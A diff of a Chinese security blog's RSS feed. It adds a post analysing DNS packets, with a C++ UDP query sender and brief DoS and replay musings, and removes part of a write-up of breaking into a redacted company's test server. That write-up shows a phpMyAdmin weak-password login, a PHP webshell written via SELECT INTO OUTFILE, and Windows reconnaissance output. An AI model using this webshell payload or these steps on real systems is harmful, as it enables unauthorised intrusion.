+0020   ac 23 b6 51 00 35 00 37 c9 33 17 c7 01 00 00 01  .#.Q.5.7.3......
+0030   00 00 00 00 00 00 63 6f 6e 6e 65 63 74 69 76 69  ......connectivi
+0040   74 79 2d 63 68 65 63 6b 06 75 62 75 6e 74 75 03  ty-check.ubuntu.
+0050   63 6f 6d 00 01 00 01 00 00                       com......
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;正确请求的数据包&quot;&gt;正确请求的数据包&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;该数据包的标志ID为：&lt;code class=&quot;highlighter-rouge&quot;&gt;0xb05c&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000   00 1c 42 00 00 18 00 1c 42 af 22 19 86 dd 60 07  ..B.....B.&quot;...`.
+0010   46 ce 00 42 11 40 fe 80 00 00 00 00 00 00 2b 48  F..B.@........+H
+0020   8e 47 77 1b 19 96 fe 80 00 00 00 00 00 00 02 1c  .Gw.............
+0030   42 ff fe 00 00 18 ce 95 00 35 00 42 4a f4 b0 5c  B........5.BJ..\
+0040   01 00 00 01 00 00 00 00 00 01 12 63 6f 6e 6e 65  ...........conne
+0050   63 74 69 76 69 74 79 2d 63 68 65 63 6b 06 75 62  ctivity-check.ub
+0060   75 6e 74 75 03 63 6f 6d 00 00 01 00 01 00 00 29  untu.com.......)
+0070   02 00 00 00 00 00 00 00                          ........
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;第一眼看区别，肯定是一大一小，是不是数据缺失了？&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;前面交代了标志ID，它是一个数据包的真正开始位置，一直到最后一个标识结束&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;那么我们从失败的和成功的标志位开始读取：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;17 c7 01 00 00 01
+00 00 00 00 00 00 63 6f 6e 6e 65 63 74 69 76 69
+74 79 2d 63 68 65 63 6b 06 75 62 75 6e 74 75 03
+63 6f 6d 00 01 00 01 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b0 5c
+01 00 00 01 00 00 00 00 00 01 12 63 6f 6e 6e 65
+63 74 69 76 69 74 79 2d 63 68 65 63 6b 06 75 62
+75 6e 74 75 03 63 6f 6d 00 00 01 00 01 00 00 29
+02 00 00 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;从 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x63&lt;/code&gt; 到 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6d&lt;/code&gt;后面的一个 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt; 都是 &lt;code class=&quot;highlighter-rouge&quot;&gt;connectivity-check.ubuntu.com&lt;/code&gt;对应&lt;code class=&quot;highlighter-rouge&quot;&gt;Question&lt;/code&gt;的字段中的&lt;code class=&quot;highlighter-rouge&quot;&gt;QNAME&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;去除以后，关键就在标志位：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;17 c7 
+01 00 00 01
+00 00 00 00 00 00 01 00 01 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;b0 5c
+01 00 00 01 00 00 00 00 00 01 12 00 01 00 01 00 00 29
+02 00 00 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;以成功报文的来看：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;前面的&lt;code class=&quot;highlighter-rouge&quot;&gt;0xb05c&lt;/code&gt;是&lt;code class=&quot;highlighter-rouge&quot;&gt;Header&lt;/code&gt;的&lt;code class=&quot;highlighter-rouge&quot;&gt;标识(ID)字段&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;向后两个字节就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x01&lt;/code&gt;与&lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt;代表 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0100&lt;/code&gt;，代表了标志位，分别说明&lt;code class=&quot;highlighter-rouge&quot;&gt;QR\OPCODE\TC\RD\Z\RCODE&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;注意：&lt;code class=&quot;highlighter-rouge&quot;&gt;OPCODE&lt;/code&gt;是四个比特位。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0... .... .... =&amp;gt; QR
+.000 0... .... =&amp;gt; OPCODE
+.... ..0. .... =&amp;gt; TC
+.... ...1 .... =&amp;gt; RD
+.... .... .0.. =&amp;gt; Z
+.... .... ..0. =&amp;gt; RCODE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;以上简写为：&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0100&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;后来在&lt;code class=&quot;highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;中发现了两个数据报文的不同：&lt;/p&gt;
+
+&lt;p&gt;![标志位][0x01]&lt;/p&gt;
+
+&lt;p&gt;标志位完全错乱了。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x06-我的dns请求&quot;&gt;0x06 我的DNS请求&lt;/h2&gt;
+
+&lt;p&gt;在理解好前面的知识以后，我们来动手写一个高大上的DNS请求程序：&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;arpa/inet.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\xa5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+                    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x12\x63\x6f\x6e\x6e\x65&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+                    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x63\x74\x69\x76\x69\x74\x79\x2d\x63\x68\x65\x63\x6b\x06\x75\x62&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+                    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x75\x6e\x74\x75\x03\x63\x6f\x6d\x00\x00\x1c\x00\x01\x00\x00\x29&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; \
+                    &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;202.101.172.35&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;sendto failed&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dnsSock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;上面的代码会向DNS服务器发送一个查询&lt;code class=&quot;highlighter-rouge&quot;&gt;connectivity-check.ubuntu.com&lt;/code&gt; A 记录的DNS请求。&lt;/p&gt;
+
+&lt;p&gt;我们来分析一下这个&lt;code class=&quot;highlighter-rouge&quot;&gt;buff code&lt;/code&gt;：&lt;/p&gt;
+
+&lt;p&gt;标志ID：&lt;code class=&quot;highlighter-rouge&quot;&gt;0x65a5&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000   00 1c 42 00 00 18 00 1c 42 af 22 19 08 00 45 00  ..B.....B.&quot;...E.
+0010   00 56 23 b3 40 00 40 11 5e 7a 0a d3 37 0e ca 65  .V#.@.@.^z..7..e
+0020   ac 23 c9 30 00 35 00 42 52 1d 65 a5 01 00 00 01  .#.0.5.BR.e.....
+0030   00 00 00 00 00 01 12 63 6f 6e 6e 65 63 74 69 76  .......connectiv
+0040   69 74 79 2d 63 68 65 63 6b 06 75 62 75 6e 74 75  ity-check.ubuntu
+0050   03 63 6f 6d 00 00 1c 00 01 00 00 29 02 00 00 00  .com.......)....
+0060   00 00 00 00                                      ....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;0x65a5&lt;/code&gt;进行剥离，我们得到如下数据包：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;65 a5 01 00 00 01
+00 00 00 00 00 01 12 63 6f 6e 6e 65 63 74 69 76
+69 74 79 2d 63 68 65 63 6b 06 75 62 75 6e 74 75
+03 63 6f 6d 00 00 1c 00 01 00 00 29 02 00 00 00
+00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;取出域名&lt;code class=&quot;highlighter-rouge&quot;&gt;Name&lt;/code&gt;范围：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;65 a5 
+01 00 00 01
+00 00 00 00 00 01 12 00 1c 00 01 00 00 29 02 00 
+00 00
+00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这样看数据包就很清晰了~&lt;/p&gt;
+
+&lt;h2 id=&quot;0x07-关于udp服务ddos拒绝服务的思考&quot;&gt;0x07 关于UDP服务DDOS拒绝服务的思考&lt;/h2&gt;
+
+&lt;p&gt;发送大量的&lt;code class=&quot;highlighter-rouge&quot;&gt;DNS递归查询&lt;/code&gt;会消耗服务端的一定资源，我们只需要设置一个&lt;code class=&quot;highlighter-rouge&quot;&gt;RD&lt;/code&gt;标志位就可以让目标服务器进行不断的递归查询&lt;/p&gt;
+
+&lt;p&gt;发送垃圾查询，例如：查询 &lt;code class=&quot;highlighter-rouge&quot;&gt;www.baidu.com\n&lt;/code&gt;  这类的域名，是肯定找不到的，并且查询很慢&lt;/p&gt;
+
+&lt;p&gt;重放UDP能够带来一定的安全隐患，我如果拥有足够大的权限，完全可以针对某个协议进行中间人攻击&lt;/p&gt;
+
+&lt;h2 id=&quot;0x08-最后的总结&quot;&gt;0x08 最后的总结&lt;/h2&gt;
+
+&lt;p&gt;学习了这么久的网络技术，最后发现就协议规范编程来说并不是很难，难就难在没有下耐心去研究，去思考。&lt;/p&gt;
+
+&lt;p&gt;整个过程需要具备以下技能：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;的灵活使用&lt;/li&gt;
+  &lt;li&gt;网络协议基础&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C/C++&lt;/code&gt;功底&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;一个疑问&quot;&gt;一个疑问&lt;/h3&gt;
+
+&lt;p&gt;我上面的&lt;code class=&quot;highlighter-rouge&quot;&gt;buff code&lt;/code&gt;操作能够重放&lt;code class=&quot;highlighter-rouge&quot;&gt;UDP&lt;/code&gt;协议数据包，重放过后我发现请求报文中的标志位无法被&lt;code class=&quot;highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;解析了，并且数据传送完毕还会附带一个&lt;code class=&quot;highlighter-rouge&quot;&gt;ICMP&lt;/code&gt;的请求。&lt;/p&gt;
+
+&lt;h3 id=&quot;结束&quot;&gt;结束&lt;/h3&gt;
+
+&lt;p&gt;以后有其他相关的东西再更新吧…… 先写到这里。&lt;/p&gt;
+</description>
+        <pubDate>Sat, 10 Feb 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/archivers/2018-02-10/1</link>
+        <guid isPermaLink="true">http://localhost:4000/archivers/2018-02-10/1</guid>
+        
+        
+        <category>nmap</category>
+        
+      </item>
     
       <item>
         <title>关于CVE-2018-6580其他Tips分析</title>
@@ -2294,1070 +2682,6 @@ REQUEST和CONNECTION ACCEPTED，然后进一步用ACK来区分是请求还是应
         
         
         <category>工具</category>
-        
-      </item>
-    
-      <item>
-        <title>针对国内一大厂的后渗透 - 持续</title>
-        <description>&lt;p&gt;此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。
-&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
-
-&lt;p&gt;此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x01-信息搜集---后渗透&quot;&gt;0x01 信息搜集 - 后渗透&lt;/h2&gt;
-
-&lt;p&gt;首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell&lt;/p&gt;
-
-&lt;p&gt;这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;操作系统&lt;/li&gt;
-  &lt;li&gt;Web服务器版本&lt;/li&gt;
-  &lt;li&gt;PHP版本&lt;/li&gt;
-  &lt;li&gt;绝对路径&lt;/li&gt;
-  &lt;li&gt;子域名&lt;/li&gt;
-  &lt;li&gt;开放端口 - 发现开启了防火墙&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;扫描到它存在&lt;code class=&quot;highlighter-rouge&quot;&gt;phpMyadmin&lt;/code&gt;，弱口令登录进入，通过常规手法SQL写入shell。&lt;/p&gt;
-
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php @assert($_POST[&quot;qyxmsq56dhaye3&quot;]);?&amp;gt;'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUTFILE&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'D:/WWW/***/master/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;通过Webshell的方式进入，肯定是要直接看权限了，但是由于是他们的测试环境，权限相对比较高。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; net user /domain
-这项请求将在域 WORKGROUP 的域控制器处理。
-
-发生系统错误 1355。
-
-指定的域不存在，或无法联系。
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;通过上面的结果可以看到该服务器并不是域成员&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\***\master\&amp;gt; query user
-* 没有用户
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;没有管理员在线&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-D:\WWW\***\master\&amp;gt; netstat -ano
-
-活动连接
-
-  协议  本地地址          外部地址        状态           PID
-  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1692
-  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1584
-  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       12
-  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
-  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1740
-  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       3740
-  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
-  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       828
-  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       1052
-  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       1108
-  TCP    0.0.0.0:49160          0.0.0.0:0              LISTENING       932
-  TCP    0.0.0.0:49161          0.0.0.0:0              LISTENING       924
-  TCP    10.***.63.178:139      0.0.0.0:0              LISTENING       4
-  TCP    10.***.191.178:139     0.0.0.0:0              LISTENING       4
-  TCP    10.***.191.178:58359   *.*.*.*:****     ESTABLISHED     5576
-  TCP    10.***.191.178:58362   *.*.*.*:****     ESTABLISHED     4700
-  TCP    *.*.*.*:****     *.*.*.*:****    TIME_WAIT       0
-  TCP    *.*.*.*:****     *.*.*.*:****    ESTABLISHED     1584
-  TCP    169.254.112.31:139     0.0.0.0:0              LISTENING       4
-  TCP    169.254.191.36:139     0.0.0.0:0              LISTENING       4
-  TCP    [::]:21                [::]:0                 LISTENING       1692
-  TCP    [::]:80                [::]:0                 LISTENING       1584
-  TCP    [::]:135               [::]:0                 LISTENING       12
-  TCP    [::]:445               [::]:0                 LISTENING       4
-  TCP    [::]:3389              [::]:0                 LISTENING       3740
-  TCP    [::]:47001             [::]:0                 LISTENING       4
-  TCP    [::]:49152             [::]:0                 LISTENING       828
-  TCP    [::]:49153             [::]:0                 LISTENING       1052
-  TCP    [::]:49154             [::]:0                 LISTENING       1108
-  TCP    [::]:49160             [::]:0                 LISTENING       932
-  TCP    [::]:49161             [::]:0                 LISTENING       924
-  UDP    0.0.0.0:500            *:*                                    1108
-  UDP    0.0.0.0:4500           *:*                                    1108
-  UDP    0.0.0.0:5355           *:*                                    1248
-  UDP    10.***.63.178:137      *:*                                    4
-  UDP    10.***.63.178:138      *:*                                    4
-  UDP    10.***.191.178:137     *:*                                    4
-  UDP    10.***.191.178:138     *:*                                    4
-  UDP    169.254.112.31:137     *:*                                    4
-  UDP    169.254.112.31:138     *:*                                    4
-  UDP    169.254.191.36:137     *:*                                    4
-  UDP    169.254.191.36:138     *:*                                    4
-  UDP    [::]:500               *:*                                    1108
-  UDP    [::]:4500              *:*                                    1108
-  UDP    [::]:5355              *:*                                    1248
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;可以发现有3389端口，我尝试了去直接连接，但是被拒绝了，绝对是防火墙做了入站限制&lt;/p&gt;
-
-&lt;p&gt;这个尝试是有风险的，因为你不知道下一步的操作能够为自己带来怎样的走向&lt;/p&gt;
-
-&lt;p&gt;再查看一下网卡：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;D:\WWW\****\master\&amp;gt; ipconfig
-
-Windows IP 配置
-
-
-以太网适配器 本地连接 4:
-
-   连接特定的 DNS 后缀 . . . . . . . : 
-   本地链接 IPv6 地址. . . . . . . . : fe80::35ec:****:321d%17
-   IPv4 地址 . . . . . . . . . . . . : 10.159.191.178
-   子网掩码  . . . . . . . . . . . . : 255.255.255.128
-   IPv4 地址 . . . . . . . . . . . . : ****
-   子网掩码  . . . . . . . . . . . . : 255.255.255.255
-   默认网关. . . . . . . . . . . . . : 10.159.191.254
-
-以太网适配器 本地连接 3:
-
-   连接特定的 DNS 后缀 . . . . . . . : 
-   本地链接 IPv6 地址. . . . . . . . : fe80::****:701f%15
-   自动配置 IPv4 地址  . . . . . . . : 169.254.112.31
-   子网掩码  . . . . . . . . . . . . : 255.255.0.0
-   默认网关. . . . . . . . . . . . . : 
-
-以太网适配器 本地连接 2:
-
-   连接特定的 DNS 后缀 . . . . . . . : 
-   本地链接 IPv6 地址. . . . . . . . : fe80::****:7c4d:bf24%13
-   自动配置 IPv4 地址  . . . . . . . : 169.254.191.36
-   子网掩码  . . . . . . . . . . . . : 255.255.0.0
-   默认网关. . . . . . . . . . . . . : 
-
-以太网适配器 本地连接:
-
-   连接特定的 DNS 后缀 . . . . . . . : 
-   本地链接 IPv6 地址. . . . . . . . : fe80::****:b5e7:5894%11
-   IPv4 地址 . . . . . . . . . . . . : 10.159.63.178
-   子网掩码  . . . . . . . . . . . . : 255.255.255.128
-   默认网关. . . . . . . . . . . . . : 
-
-隧道适配器 isatap.{228D34A2-****-B05B-2891059A32DF}:
-
-   媒体状态  . . . . . . . . . . . . : 媒体已断开
-   连接特定的 DNS 后缀 . . . . . . . : 
-
-隧道适配器 isatap.{9F839E1D-****-82F7-592092A89872}:
-
-   媒体状态  . . . . . . . . . . . . : 媒体已断开
-   连接特定的 DNS 后缀 . . . . . . . : 
-
-隧道适配器 isatap.{C900083B-5E7E-****-8BC25B24D7C1}:
-
-   媒体状态  . . . . . . . . . . . . : 媒体已断开
-   连接特定的 DNS 后缀 . . . . . . . : 
-
-隧道适配器 isatap.{0E2DB1B0-50C3-****-4F5513DCBD08}:
-
-   媒体状态  . . . . . . . . . . . . : 媒体已断开
-   连接特定的 DNS 后缀 . . . . . . . : 
-
-隧道适配器 6TO4 Adapter:
-
-   连接特定的 DNS 后缀 . . . . . . . : 
-   IPv6 地址 . . . . . . . . . . . . : ***
